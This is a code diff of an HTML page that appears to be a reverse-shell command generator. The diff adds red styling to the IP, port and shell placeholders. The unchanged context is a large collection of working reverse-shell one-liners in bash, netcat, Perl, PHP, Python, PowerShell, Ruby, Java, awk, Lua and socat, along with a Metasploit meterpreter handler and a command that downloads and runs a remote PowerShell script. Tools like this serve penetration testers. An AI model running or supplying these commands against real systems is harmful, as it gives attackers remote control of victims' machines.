@@ -38,7 +38,13 @@ p.solid {border-style: solid;}
   display: flex;
   flex-wrap: wrap;
 }
-
+#roundcorners{
+  border-radius: 25px;
+  background: #73AD21;
+  padding: 20px; 
+  width: 300px;
+  height: 100px;  
+}
 .float-left-child {
   float: left;
 }
@@ -233,6 +239,10 @@ background-color: #666;
 .flex-item{
     flex-grow: 20;
 }
+ 
+
+ 
+ 
 </style>
   
 </head>
@@ -275,9 +285,10 @@ background-color: #666;
  
 <p>Port:</p>
  <input id="numb" id="port" onchange="secFunction()">
-    
-    
-    <br>
+     <br>
+
+ 
+ 
     <br>
   </ul>
   
@@ -310,10 +321,10 @@ background-color: #666;
   <div id="socat" class="w3-container city1 w3-animate-opacity">
   <br>
 <div id="mydiv">
-  <p id="again special"></p>
+  <p style="color:red;" id="again special"></p>
   <p> &nbsp </p>
       <p>socat -d -d TCP-LISTEN:</p>
-      <p id="port hundred one"></p>
+      <p style="color:red;" id="port hundred one"></p>
   <p> &nbsp;STDOUT</p>
   </div>
  </div>
@@ -325,16 +336,16 @@ background-color: #666;
  
    <p>
       <div id="mydiv">
-     <p id="special cases"></p>
+     <p style="color:red;" id="special cases"></p>
    <p>&nbsp msfconsole -q -x &#8243use multi/handler;
 set payload windows/x64/meterpreter/reverse_tcp;</p>
 </div>
     <div id="mydiv">
   <p>  set lhost&nbsp</p>
-   <p id="demo"></p>
+   <p style="color:red;" id="demo"></p>
 <p>; set lport&nbsp</p>
 
- <p id="port hundred"> </p>
+ <p style="color:red;" id="port hundred"> </p>
   <p>; exploit&#8243</p>
   </div>
     </p>
@@ -369,15 +380,20 @@ set payload windows/x64/meterpreter/reverse_tcp;</p>
 
 <br>
 <br>
+ 
    <div id ="mydiv">
-   <p id="other cases"></p>
+     
+
+   <p style="color:red;" id="other cases"></p>
    <p> &nbsp</p>
  <div class="result"></div>
   
-   <p id="input port"> </p>
+ 
+   <p style="color:red;" id="input port"> </p>
   
+   
      </div>
-  
+ 
       
       
    
@@ -590,12 +606,12 @@ osans.addEventListener('change', (event) => {
     <p>Command:</p>
    
     <div id="mydiv">
-           <div class="shellans"> </div>
+           <div style="color:red;" class="shellans"> </div>
     <p> &nbsp -i >& /dev/tcp/ </p>
-    <p id="ip eighteen"></p>
+    <p style="color:red;" id="ip eighteen"></p>
 
 <p> / </p>
-<p id="port eighteen"></p>
+<p style="color:red;" id="port eighteen"></p>
 
  
     <p> &nbsp 0>&1  </p>
@@ -617,11 +633,11 @@ osans.addEventListener('change', (event) => {
     <div id="mydiv">
     <p> 0&lt&196;exec 196&lt&gt/dev/tcp/
     </p>
-    <p id="ip nineteen"></p>
+    <p style="color:red;" id="ip nineteen"></p>
     <p>/</p>
-    <p id="port nineteen"></p>
+    <p style="color:red;" id="port nineteen"></p>
     <p>;</p>
-     <div class="one"> </div>
+     <div style="color:red;" class="one"> </div>
     
     <p>&nbsp &lt&196 >&196 2>&196</p>
 
@@ -642,9 +658,9 @@ osans.addEventListener('change', (event) => {
   <p>Command:</p>
     <div id="mydiv">
     <p>  exec 5<>/dev/tcp/
-    <p id="ip twenty"></p>
+    <p style="color:red;" id="ip twenty"></p>
     <p>/</p>
-    <p id="port twenty"></p>
+    <p style="color:red;" id="port twenty"></p>
     
     <p>;cat <&5 | while read line; do $line 2>&5 >&5; done  </p>
    
@@ -662,11 +678,11 @@ osans.addEventListener('change', (event) => {
    
   <p>Command:</p>
    <div id="mydiv">
-       <div class="two"> </div>
+       <div style="color:red;" class="two"> </div>
     <p> &nbsp -i 5<> /dev/tcp/</p>
-    <p id="ip twenty one"></p>
+    <p style="color:red;" id="ip twenty one"></p>
     <p>/</p>
-    <p id="port twenty one"></p>
+    <p style="color:red;" id="port twenty one"></p>
     <p>&nbsp 0<&5 1>&5 2>&5 </p>
     
      </div>
@@ -682,11 +698,11 @@ osans.addEventListener('change', (event) => {
    
   <p>Command:</p>
      <div id="mydiv">
-     <div class="three"> </div>
+     <div style="color:red;" class="three"> </div>
     <p> &nbsp -i >& /dev/udp/ </p>
-    <p id="ip twenty two"></p>
+    <p style="color:red;" id="ip twenty two"></p>
     <p>/</p>
-    <p id="port twenty two"></p>
+    <p style="color:red;" id="port twenty two"></p>
     
     
     <p> &nbsp 0>&1 </p>
@@ -708,11 +724,11 @@ osans.addEventListener('change', (event) => {
   <p>Command:</p>
     <div id="mydiv">
     <p>  nc -e &nbsp  </p>
-    <div class="four"> </div>
+    <div style="color:red;" class="four"> </div>
     <p> &nbsp </p>
-        <p id="ip twenty three"></p>
+        <p  style="color:red;" id="ip twenty three"></p>
     <p> &nbsp </p>
-        <p id="port twenty three"></p>
+        <p style="color:red;" id="port twenty three"></p>
      
      </div>
 </div>
@@ -725,11 +741,11 @@ osans.addEventListener('change', (event) => {
   <p>Command:</p>
       <div id="mydiv">
     <p>  nc.exe -e &nbsp   </p>
-    <div class="five"> </div>
+    <div style="color:red;" class="five"> </div>
        <p> &nbsp </p>
-        <p id="ip twenty four"></p>
+        <p style="color:red;" id="ip twenty four"></p>
     <p> &nbsp </p>
-        <p id="port twenty four"></p>
+        <p style="color:red;" id="port twenty four"></p>
 
     
           </div>
@@ -744,11 +760,11 @@ osans.addEventListener('change', (event) => {
   <p>Command:</p>
       <div id="mydiv">
     <p> nc -c &nbsp</p>
-    <div class="six"> </div>
+    <div style="color:red;" class="six"> </div>
         <p> &nbsp </p>
-        <p id="ip twenty five"></p>
+        <p style="color:red;" id="ip twenty five"></p>
     <p> &nbsp </p>
-        <p id="port twenty five"></p>
+        <p style="color:red;" id="port twenty five"></p>
 
     
           </div>
@@ -765,13 +781,13 @@ osans.addEventListener('change', (event) => {
     <p> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|</p>
     
     
-     <div class="seven"> </div>
+     <div style="color:red;" class="seven"> </div>
      
      
      <p>&nbsp -i 2>&1|ncat -u &nbsp </p>
-      <p id="ip twenty six"></p>
+      <p style="color:red;" id="ip twenty six"></p>
     <p> &nbsp </p>
-        <p id="port twenty six"></p>
+        <p style="color:red;" id="port twenty six"></p>
         
     <p>&nbsp >/tmp/f </p>
     
@@ -788,11 +804,11 @@ osans.addEventListener('change', (event) => {
         <div id="mydiv">
     <p>  ncat </p>
          <p> &nbsp </p>
-        <p id="ip twenty seven"></p>
+        <p  style="color:red;" id="ip twenty seven"></p>
     <p> &nbsp </p>
-        <p id="port twenty seven"></p>
+        <p style="color:red;" id="port twenty seven"></p>
         <p>&nbsp  -e bash &nbsp </p>
-    <div class="eight"> </div>
+    <div style="color:red;" class="eight"> </div>
      
 </div>
 </div>
@@ -807,12 +823,12 @@ osans.addEventListener('change', (event) => {
     <div id="mydiv">
     <p> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|</p>
     
-    <div class="nine"> </div>
+    <div style="color:red;" class="nine"> </div>
     
    <p> &nbsp -i 2>&1|nc &nbsp </p>
-    <p id="ip twenty eight"></p>
+    <p style="color:red;" id="ip twenty eight"></p>
     <p> &nbsp </p>
-        <p id="port twenty eight"></p>
+        <p  style="color:red;" id="port twenty eight"></p>
    
    <p> &nbsp >/tmp/f  </p>
     
@@ -830,11 +846,11 @@ osans.addEventListener('change', (event) => {
   <p>Command:</p>
      <div id="mydiv">
     <p>  ncat.exe &nbsp</p>
-    <p id="ip twenty nine"></p>
+    <p  style="color:red;" id="ip twenty nine"></p>
     <p> &nbsp </p>
-        <p id="port twenty nine"></p>
+        <p style="color:red;" id="port twenty nine"></p>
        <p> &nbsp -e &nbsp </p>
-    <div class="ten"> </div>
+    <div style="color:red;" class="ten"> </div>
      
 </div>
 </div>
@@ -861,7 +877,7 @@ int main(void){
   <div id="mydiv">
   <p>  int port =</p>
    <p> &nbsp </p>
-        <p id="port thirty"></p>
+        <p style="color:red;" id="port thirty"></p>
           
  <p>;</p>
   </div>
@@ -873,7 +889,7 @@ int main(void){
    <p>  revsockaddr.sin_port = htons(port);</p>
    <div id="mydiv">
    <p>  revsockaddr.sin_addr.s_addr = inet_addr("</p>
-   <p id="ip thirty"></p>
+   <p style="color:red;" id="ip thirty"></p>
    <p>");</p>
 </div>
    <p>  connect(sockt, (struct sockaddr *) &amp revsockaddr, </p>
@@ -884,13 +900,13 @@ int main(void){
 
  <div id="mydiv">
      <p> char * const argv[] = {"</p>
-     <div class="eleven"> </div>
+     <div style="color:red;" class="eleven"> </div>
      <p>", NULL};</p>
      </div>
      
       <div id="mydiv">
      <p> execve("</p>
-     <div class="shellans"> </div>
+     <div style="color:red;" class="twohundred"> </div>
      <p>", argv, NULL);</p>
 </div>
      <p> return 0;  </p>     
@@ -916,13 +932,13 @@ int main(void){
  
  <div id="mydiv">
  <p> char ip_addr[16] = "</p>
-  <p id="ip thirty one"></p>
+  <p style="color:red;" id="ip thirty one"></p>
 <p> "; </p>
 </div>
 
 <div id="mydiv">
  <p> char port[6] = "</p>
-  <p id="port thirty one"></p>
+  <p style="color:red;" id="port thirty one"></p>
   <p>";   </p>   
  
  </div>
@@ -997,10 +1013,10 @@ int main(void){
        
  <div id="mydiv">
 		  <p> 	using(TcpClient client = new TcpClient("</p>
-        <p id="ip thirty two"></p>
+        <p style="color:red;" id="ip thirty two"></p>
       <p>    ", </p>
           <p> &nbsp </p>
-            <p id="port thirty two"></p>
+            <p style="color:red;" id="port thirty two"></p>
          <p> ))</p>
           </div>
           
@@ -1078,11 +1094,11 @@ int main(void){
 
  <div id="mydiv">
     <p> main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f |&nbsp</p>
-   <div class="twelve"> </div>
+   <div style="color:red;" class="twelve"> </div>
     <p>&nbsp -i 2>&1 | nc&nbsp</p>
-         <p id="ip thirty three"></p>
+         <p style="color:red;" id="ip thirty three"></p>
    <p> &nbsp </p>
-         <p id="port thirty three"></p>
+         <p style="color:red;" id="port thirty three"></p>
    <p> &nbsp>/tmp/f" </p>
    </div>
     </p>
@@ -1103,15 +1119,15 @@ int main(void){
  
   <div id="mydiv">
    <p>perl -e 'use Socket;$i=&quot</p>
-   <p id="ip thirty four"></p>
+   <p style="color:red;" id="ip thirty four"></p>
   
        
   <p>&quot ;$p=</p>
 
-   <p id="port thirty four"></p>
+   <p style="color:red;" id="port thirty four"></p>
    <p>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec(&quot</p>
  
-    <div class="thirteen"> </div>
+    <div  style="color:red;" class="thirteen"> </div>
     <p>&nbsp -i");};' </p>
     </div>
       
@@ -1130,9 +1146,9 @@ int main(void){
    <div id="mydiv">
     <p> 
     perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"</p>
-      <p id="ip thirty five"></p>
+      <p style="color:red;" id="ip thirty five"></p>
       <p> :</p>
-      <p id="port thirty five"></p>
+      <p style="color:red;" id="port thirty five"></p>
     
     <p>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while&lt>;'
     
@@ -1154,13 +1170,13 @@ int main(void){
   <div id="mydiv">
     <p>  rcat </p>
         <p> &nbsp </p>
-        <p id="ip thirty six"></p>
+        <p style="color:red;" id="ip thirty six"></p>
     <p> &nbsp </p>
-        <p id="port thirty six"></p>
+        <p style="color:red;" id="port thirty six"></p>
          <p> &nbsp </p>
          <p>-r</p>
          <p> &nbsp </p>
-            <div class="fourteen"> </div>
+            <div style="color:red;" class="fourteen"> </div>
         
     </div>
     
@@ -1191,13 +1207,13 @@ int main(void){
     
       <div id="mydiv">
     <p>"</p>
-     <p id="ip thirty seven"></p>
+     <p style="color:red;" id="ip thirty seven"></p>
        <p>"</p>
        <p> ;$ð» =</p> &nbsp 
-       <p id="port thirty seven"></p>
+       <p style="color:red;" id="port thirty seven"></p>
      <p>;$ð = "</p>
      
-    <div class="fifteen"> </div>
+    <div style="color:red;" class="fifteen"> </div>
      
      <p>". $ð¤</p>
      </div>
@@ -1230,14 +1246,14 @@ int main(void){
 
   <div id="mydiv">
 $ip = '</p>
-<p id="ip thirty eight"></p>
+<p style="color:red;" id="ip thirty eight"></p>
 ';
 </div>
 
 
   <div id="mydiv">
 $port = 
-<p id="port thirty eight"></p>
+<p style="color:red;" id="port thirty eight"></p>
 ;
 </div>
 
@@ -1245,7 +1261,7 @@ $port =
 <p>$write_a = null;</p>
 <p>$error_a = null;</p>
 <p>$shell = 'uname -a; w; id;&nbsp</p>
- <div class="sixteen"> </div>
+ <div style="color:red;" class="sixteen"> </div>
 
 <p>&nbsp -i';</p>
 <p>$daemon = 0;</p>
@@ -1401,7 +1417,7 @@ $port =
      <div id="mydiv">
     
      <p>       $this->shell = '</p>
-       <div class="seventeen"> </div>
+       <div style="color:red;"  class="seventeen"> </div>
     <p> ';  </p>
      
      
@@ -1563,10 +1579,10 @@ $port =
 
   <div id="mydiv">
 <p>$sh = new Shell('</p>
-<p id="ip thirty nine"></p>
+<p style="color:red;" id="ip thirty nine"></p>
 
 <p>',&nbsp</p>
-<p id="port thirty nine"></p>
+<p style="color:red;" id="port thirty nine"></p>
 <p>);  </p>  
 
 </div>
@@ -1637,13 +1653,13 @@ $port =
     <p>  
     
     php -r '$sock=fsockopen("</p>
-    <p id="ip fourty"></p>
+    <p style="color:red;" id="ip fourty"></p>
    <p> ",</p>
 
-<p id="port fourty"></p>
+<p style="color:red;" id="port fourty"></p>
    <p>);exec("</p>
    
-    <div class="eighteen"> </div>
+    <div style="color:red;" class="eighteen"> </div>
     
    <p>&nbsp &lt&3 >&amp3 2>&amp3");'</p>
     </p>
@@ -1666,13 +1682,13 @@ $port =
     <p>  
     
     php -r '$sock=fsockopen("</p>
-    <p id="ip fourty one"></p>
+    <p style="color:red;" id="ip fourty one"></p>
    <p> ",</p>
 
-<p id="port fourty one"></p>
+<p style="color:red;" id="port fourty one"></p>
    <p>);shell_exec("</p>
    
-    <div class="nineteen"> </div>
+    <div  style="color:red;" class="nineteen"> </div>
     
    <p>&nbsp &lt&3 >&amp3 2>&amp3");'</p>
     </p>
@@ -1696,13 +1712,13 @@ $port =
     <p>  
     
     php -r '$sock=fsockopen("</p>
-    <p id="ip fourty two"></p>
+    <p style="color:red;" id="ip fourty two"></p>
    <p> ",</p>
 
-<p id="port fourty two"></p>
+<p style="color:red;" id="port fourty two"></p>
    <p>);system("</p>
    
-    <div class="twenty"> </div>
+    <div style="color:red;" class="twenty"> </div>
     
    <p>&nbsp &lt&3 >&amp3 2>&amp3");'</p>
     </p>
@@ -1726,13 +1742,13 @@ $port =
     <p>  
     
     php -r '$sock=fsockopen("</p>
-    <p id="ip fourty three"></p>
+    <p style="color:red;" id="ip fourty three"></p>
    <p> ",</p>
 
-<p id="port fourty three"></p>
+<p style="color:red;" id="port fourty three"></p>
    <p>);passthru("</p>
    
-    <div class="twentyone"> </div>
+    <div style="color:red;" class="twentyone"> </div>
     
    <p>&nbsp &lt&3 >&amp3 2>&amp3");'</p>
     </p>
@@ -1755,11 +1771,11 @@ $port =
    <div id="mydiv">
     <p> 
     php -r '$sock=fsockopen("</p>
-        <p id="ip fourty four"></p>
+        <p style="color:red;" id="ip fourty four"></p>
     <p>",&nbsp</p>
-    <p id="port fourty four"></p>
+    <p style="color:red;" id="port fourty four"></p>
     <p>);`&nbsp</p>
-    <div class="twentytwo"> </div>
+    <div style="color:red;" class="twentytwo"> </div>
     <p> &nbsp&lt&3 >&3 2>&3`;'
     </p>
  
@@ -1778,14 +1794,14 @@ $port =
      <div id="mydiv">
     <p> 
     php -r '$sock=fsockopen("</p>
-       <p id="ip fourty five"></p>
+       <p style="color:red;" id="ip fourty five"></p>
      <p>",</p>
-    <p id="port fourty five"></p>
+    <p style="color:red;" id="port fourty five"></p>
     
    <p> );popen("</p>
     
     
-    <div class="twentythree"> </div>
+    <div style="color:red;" class="twentythree"> </div>
     <p> &nbsp&lt&3 >&3 2>&3", "r");'</p>
     
     </p>
@@ -1806,12 +1822,12 @@ $port =
      <div id="mydiv">
     <p> 
     php -r '$sock=fsockopen("</p>
-     <p id="ip fourty six"></p>
+     <p style="color:red;" id="ip fourty six"></p>
      <p>",</p>
-    <p id="port fourty six"></p>
+    <p style="color:red;"  id="port fourty six"></p>
     
    <p> );$proc=proc_open("</p>
-    <div class="twentyfour"> </div>
+    <div style="color:red;" class="twentyfour"> </div>
    
    <p>", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
     
@@ -1837,9 +1853,9 @@ $port =
     
     
     IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell&nbsp</p>
-      <p id="ip fourty seven"></p>
+      <p style="color:red;" id="ip fourty seven"></p>
      <p>&nbsp</p>
-       <p id="port fourty seven"></p>
+       <p style="color:red;" id="port fourty seven"></p>
  
     </p>
      
@@ -1860,10 +1876,10 @@ $port =
    <div id="mydiv">
     <p>  
     awk 'BEGIN {s = "/inet/tcp/0/</p>
-     <p id="ip fourty eight"></p>
+     <p style="color:red;" id="ip fourty eight"></p>
    <p> /</p>
     
-     <p id="port fourty eight"></p>
+     <p style="color:red;" id="port fourty eight"></p>
     <p>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
     
     
@@ -1885,9 +1901,9 @@ $port =
   
     <div id="mydiv">
     <p> powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("</p>
-      <p id="ip fourty nine"></p>
+      <p style="color:red;" id="ip fourty nine"></p>
      <p>",</p>
-    <p id="port fourty nine"></p>
+    <p style="color:red;" id="port fourty nine"></p>
      </div>
    <p>  );$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};</p>
    <p>    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data </p>
@@ -1914,9 +1930,9 @@ $port =
       <div id="mydiv">
     <p>  
     powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('</p>
-    <p id="ip fifty"></p>
+    <p style="color:red;" id="ip fifty"></p>
      <p>',</p>
-    <p id="port fifty"></p>
+    <p style="color:red;" id="port fifty"></p>
  
   <p>  );$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};</p>
       </div> 
@@ -1949,9 +1965,9 @@ $port =
           <div id="mydiv">
     <p>powershell -nop -W hidden -noni -ep bypass -c "$TCPClient =
      New-Object Net.Sockets.TCPClient('</p>
-     <p id="ip fifty one"></p>
+     <pstyle="color:red;" id="ip fifty one"></p>
      <p>',</p>
-    <p id="port fifty one"></p>
+    <p style="color:red;" id="port fifty one"></p>
     
     </div>
     
@@ -1987,9 +2003,9 @@ $port =
     <p> 
     powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('</p>
     
-     <p id="ip fifty two"></p>
+     <p style="color:red;" id="ip fifty two"></p>
      <p>',</p>
-    <p id="port fifty two"></p>
+    <p style="color:red;"id="port fifty two"></p>
     
     </div>
   <p>  );$NetworkStream = $TCPClient.GetStream();$SslStream =  </p>
@@ -2079,9 +2095,9 @@ $port =
     
     zsh -c 'zmodload zsh/net/tcp && ztcp </p>
     <p>&nbsp</p>
-    <p id="ip fifty three"></p>
+    <p style="color:red;" id="ip fifty three"></p>
      <p>&nbsp</p>
-       <p id="port fifty three"></p>
+       <p style="color:red;" id="port fifty three"></p>
        <p>&nbsp</p>
     <p>&& zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
     
@@ -2105,16 +2121,16 @@ $port =
     <p>
     
     export RHOST="</p>
-    <p id="ip fifty four"></p>
+    <p style="color:red;"  id="ip fifty four"></p>
     
    <p> ";export RPORT=</p>
     
-       <p id="port fifty four"></p>
+       <p style="color:red;" id="port fifty four"></p>
    <p> ;python -c 'import sys,socket,os,pty;s=socket.socket();</p>
     <p> s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));</p>
     <p> [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("</p>
     
-     <div class="twentyfive"> </div>
+     <div style="color:red;" class="twentyfive"> </div>
     
   <p>  ")'
       </div>
@@ -2135,14 +2151,14 @@ $port =
     python -c 'import socket,subprocess,os;s=socket.socket</p>
     <p>(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</p>
     
-     <p id="ip fifty five"></p>
+     <p style="color:red;" id="ip fifty five"></p>
      <p>",</p>
-    <p id="port fifty five"></p>
+    <p style="color:red;" id="port fifty five"></p>
     
   <p>  ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);</p>
    <p> os.dup2(s.fileno(),2);import pty; pty.spawn("</p>
   
-   <div class="twentysix"> </div>
+   <div style="color:red;" class="twentysix"> </div>
  <p>  ")'</p>
   
     
@@ -2163,16 +2179,16 @@ $port =
     <p> 
     export RHOST="</p>
     
-     <p id="ip fifty six"></p>
+     <p style="color:red;" id="ip fifty six"></p>
     
     <p>";export RPORT=</p>
     
-    <p id="port fifty six"></p>
+    <p style="color:red;" id="port fifty six"></p>
     <p>;python3 -c 'import sys,socket,os,pty;s=socket.socket();</p>
       <p>s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));</p>
     <p>  [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("</p>
     
-      <div class="twentyseven"> </div>
+      <div style="color:red;" class="twentyseven"> </div>
    <p> ")'</p>
     
     
@@ -2197,13 +2213,13 @@ $port =
     python3 -c 'import socket,subprocess,os;s=socket.socket</p>
    <p> (socket.AF_INET,socket.SOCK_STREAM);s.connect(("</p>
     
-    <p id="ip fifty seven"></p>
+    <p style="color:red;" id="ip fifty seven"></p>
      <p>",</p>
-    <p id="port fifty seven"></p>
+    <p style="color:red;" id="port fifty seven"></p>
     
    <p> ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);</p>
     <p> os.dup2(s.fileno(),2);import pty; pty.spawn("</p>
-     <div class="twentyeight"> </div>
+     <div style="color:red;" class="twentyeight"> </div>
  <p>  ")'</p>
     
     
@@ -2226,15 +2242,15 @@ $port =
     
     python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("
     </p>
-     <p id="ip fifty eight"></p>
+     <p style="color:red;" id="ip fifty eight"></p>
      <p>",</p>
-    <p id="port fifty eight"></p>
+    <p  style="color:red;" id="port fifty eight"></p>
     
     
     
    <p> ));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("</p>
     
-    <div class="twentynine"> </div>
+    <div style="color:red;" class="twentynine"> </div>
     
     
    <p> ")'
@@ -2258,15 +2274,15 @@ $port =
     <p> 
     TF=$(mktemp -u);mkfifo $TF && telnet&nbsp</p>
     
-     <p id="ip fifty nine"></p>
+     <p style="color:red;" id="ip fifty nine"></p>
      <p>&nbsp</p>
-    <p id="port fifty nine"></p>
+    <p style="color:red;" id="port fifty nine"></p>
     
     <p>&nbsp0&lt$TF |</p>
     
     </p>&nbsp</p>
     
-    <div class="thirty"> </div>
+    <div style="color:red;" class="thirty"> </div>
     
     <p>&nbsp1>$TF</p>
      
@@ -2284,9 +2300,9 @@ $port =
     <p> 
     ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("</p>
     
-      <p id="ip sixty"></p>
+      <p style="color:red;" id="ip sixty"></p>
      <p>",</p>
-    <p id="port sixty"></p>
+    <p style="color:red;" id="port sixty"></p>
     
    <p> ))'
    
@@ -2307,9 +2323,9 @@ $port =
     
     ruby -rsocket -e'exit if fork;c=TCPSocket.new("</p>
     
-     <p id="ip sixty one"></p>
+     <p style="color:red;" id="ip sixty one"></p>
      <p>","</p>
-    <p id="port sixty one"></p>
+    <p style="color:red;" id="port sixty one"></p>
     
     
   <p>  ");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
@@ -2336,9 +2352,9 @@ $port =
 <p>
  <div id="mydiv">
  <p>   Socket.connect("
-   <p id="ip sixty two"></p>
+   <p style="color:red;" id="ip sixty two"></p>
  <p>", </p>
-   <p id="port sixty two"></p>
+   <p style="color:red;" id="port sixty two"></p>
 <p> ).then((socket) { </p>
 
 
@@ -2351,7 +2367,7 @@ $port =
      <div id="mydiv">
      <p>   Process.start('
      
-     <div class="thirtyone"> </div>
+     <div style="color:red;" class="thirtyone"> </div>
      
      ', []).then((Process process) { </p>
      
@@ -2389,12 +2405,12 @@ $port =
   <p>Command:</p>
       <div id="mydiv">
     <p>  socat TCP:
-      <p id="ip sixty three"></p>
+      <p  style="color:red;" id="ip sixty three"></p>
     <p>:</p>
-     <p id="port sixty three"></p>
+     <p  style="color:red;" id="port sixty three"></p>
       <p> &nbsp</p>
     <p>EXEC: </p>
-    <div class="thirtytwo"> </div>
+    <div style="color:red;" class="thirtytwo"> </div>
  </div>    
 </div>
 </div>
@@ -2407,12 +2423,12 @@ $port =
   <p>Command:</p>
     <div id="mydiv">
     <p> socat TCP:</p>
-     <p id="ip sixty four"></p>
+     <p  style="color:red;" id="ip sixty four"></p>
     <p>:</p>
-     <p id="port sixty four"></p>
+     <p style="color:red;" id="port sixty four"></p>
         <p> &nbsp</p>
    <p> EXEC:'</p>
-     <div class="thirtythree"> </div>
+     <div style="color:red;" class="thirtythree"> </div>
    <p> ',pty,stderr,setsid,sigint,sane</p>
   
  </div>    
@@ -2428,11 +2444,11 @@ $port =
   <div id="mydiv">
     <p> require('child_process').exec('nc -e&nbsp</p>
     
-   <div class="thirtyfour"> </div>
+   <div style="color:red;" class="thirtyfour"> </div>
    <p> &nbsp</p>
-  <p id="ip sixty five"></p>
+  <p style="color:red;" id="ip sixty five"></p>
     <p> &nbsp</p>
-    <p id="port sixty five"></p>
+    <p style="color:red;" id="port sixty five"></p>
     <p>')</p>
  </div>
      
@@ -2454,7 +2470,7 @@ $port =
         
          <p> <div id="mydiv">
         <p>  sh = cp.spawn(" </p>
-        <div class="thirtyfive"> </div>
+        <div style="color:red;" class="thirtyfive"> </div>
         <p>  ", []); </p>
         </div>
         </p>
@@ -2462,9 +2478,9 @@ $port =
     <p>
       <div id="mydiv">
    <p> client.connect(</p>
-    <p id="port sixty six"></p>
+    <p style="color:red;" id="port sixty six"></p>
   <p> , "</p>
-    <p id="ip sixty six"></p>
+    <p style="color:red;" id="ip sixty six"></p>
    <p> ", function(){</p>
     </div>
     </p>
@@ -2492,13 +2508,13 @@ $port =
   <div id="mydiv">
     <p> 
     String host="</p>
-    <p id="ip sixty seven"></p>
+    <p style="color:red;" id="ip sixty seven"></p>
     
    <p> ";int port=</p>
-    <p id="port sixty seven"></p>
+    <p style="color:red;" id="port sixty seven"></p>
     <p>;String cmd="</p>
     
-     <div class="thirtysix"> </div>
+     <div style="color:red;" class="thirtysix"> </div>
            </div>
     <p>";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();</p>
          
@@ -2533,10 +2549,10 @@ $port =
          <div id="mydiv">
            <p> p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/</p>
            
-            <p id="ip sixty eight"></p>
+            <p style="color:red;"  id="ip sixty eight"></p>
         
         <p>/</p>
-            <p id="port sixty eight"></p>
+            <p style="color:red;" id="port sixty eight"></p>
        <p> &nbsp0>&1")</p>
             </div>
             </p>
@@ -2565,10 +2581,10 @@ $port =
     <p>
          <div id="mydiv">
      <p>   ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/</p>
-            <p id="ip sixty nine"></p>
+            <p style="color:red;" id="ip sixty nine"></p>
         
         <p>/</p>
-            <p id="port sixty nine"></p>
+            <p style="color:red;" id="port sixty nine"></p>
        <p> &nbsp0>&1")</p>
         
         
@@ -2607,17 +2623,17 @@ $port =
    <p>
       <div id="mydiv">
    <p>       String host = "
-     <p id="ip seventy"></p>
+     <p style="color:red;" id="ip seventy"></p>
    <p>";</p>
    </div>
       <div id="mydiv">
     <p>      int port = </p>
-      <p id="port seventy"></p>
+      <p style="color:red;" id="port seventy"></p>
     <p>;</p>
     </div>
      <div id="mydiv">
      <p>     String cmd = "
-       <div class="thirtyseven"> </div>
+       <div style="color:red;" class="thirtyseven"> </div>
      </p>
     <p> ";</p>
     </div>
@@ -2665,7 +2681,7 @@ $port =
     <p>  
       <div id="mydiv">
   <p>  String command = "var host = '</p>
-  <p id="ip seventy one"></p>
+  <p style="color:red;" id="ip seventy one"></p>
   <p>';" +</p>
   
   </div>
@@ -2674,14 +2690,14 @@ $port =
   <div id="mydiv">
                       <p> "var port = </p>
                       
-                        <p id="port seventy one"></p>
+                        <p style="color:red;" id="port seventy one"></p>
                       ;" +</p>
                       </div>
                       
                         <div id="mydiv">
                       <p> "var cmd = '
                       
-                        <div class="thirtyeight"> </div>
+                        <div style="color:red;" class="thirtyeight"> </div>
                       ';"+</p>
                       </div>
                       </p>
@@ -2728,13 +2744,13 @@ ref.add(new StringRefAddr("x", x);</p>
    <div id="mydiv">
     <p> lua -e "require('socket');require('os');t=socket.tcp();t:connect('</p>
     
-    <p id="ip seventy two"></p>
+    <p style="color:red;" id="ip seventy two"></p>
      <p> ','</p>
-    <p id="port seventy two"></p>
+    <p style="color:red;" id="port seventy two"></p>
     
     <p>');os.execute('</p>
      <p> &nbsp</p>
-    <div class="thirtynine"> </div>
+    <div style="color:red;" class="thirtynine"> </div>
      <p> &nbsp</p>
    <p> -i &lt&3 >&3 2>&3');"
     </p>
@@ -2752,9 +2768,9 @@ ref.add(new StringRefAddr("x", x);</p>
     <p> lua5.1 -e 'local host, port = "</p>
     
     
-        <p id="ip seventy three"></p>
+        <p style="color:red;" id="ip seventy three"></p>
      <p> ",</p>
-    <p id="port seventy three"></p>
